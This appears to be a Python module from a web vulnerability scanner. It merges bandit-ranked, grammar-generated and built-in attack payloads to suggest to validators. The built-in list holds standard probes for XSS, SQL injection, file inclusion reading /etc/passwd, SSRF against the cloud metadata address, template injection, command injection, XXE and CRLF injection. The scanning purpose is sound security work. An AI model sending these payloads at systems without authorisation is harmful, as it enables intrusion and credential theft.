"""Local payload engine that aggregates built-in payloads, grammar-derived
payloads, and bandit-suggested arms to provide suggestions for validators.
"""
from __future__ import annotations

from typing import List
from pathlib import Path

from .bandit_agent import top_arms
from .exploit_grammar import payloads_for_vuln

DEFAULTS = {
    "xss": ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>"] ,
    "sqli": ["' OR '1'='1", "1' OR '1'='1", "' AND SLEEP(5)-- -"],
    "lfi": ["../../../../etc/passwd", "/etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "ssrf": ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"],
    "ssti": ["{{7*7}}", "<%= 7*7 %>"],
    "cmdi": ["; sleep 5", "&& sleep 5"],
    "open_redirect": ["https://example.com"],
    "xxe": ["<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"],
    "idor": ["1", "2", "3"],
    "crlf_injection": ["%0d%0aX-CRLF:%20injected"],
    "path_traversal": ["../../../../etc/passwd"],
    "rfi": ["file:///etc/passwd"],
}


def suggest_payloads(vuln_type: str, n: int = 10, storage_dir: Path | None = None) -> List[str]:
    out: List[str] = []

    # 1. Bandit top arms
    arms = top_arms(vuln_type=vuln_type, n=n, storage_dir=storage_dir)
    for p, _ in arms:
        if p not in out:
            out.append(p)
        if len(out) >= n:
            return out

    # 2. Grammar-derived payloads
    grammar_p = payloads_for_vuln(vuln_type, n=n, storage_dir=storage_dir)
    for p in grammar_p:
        if p not in out:
            out.append(p)
        if len(out) >= n:
            return out

    # 3. Built-in defaults
    for p in DEFAULTS.get(vuln_type, []):
        if p not in out:
            out.append(p)
        if len(out) >= n:
            return out

    return out
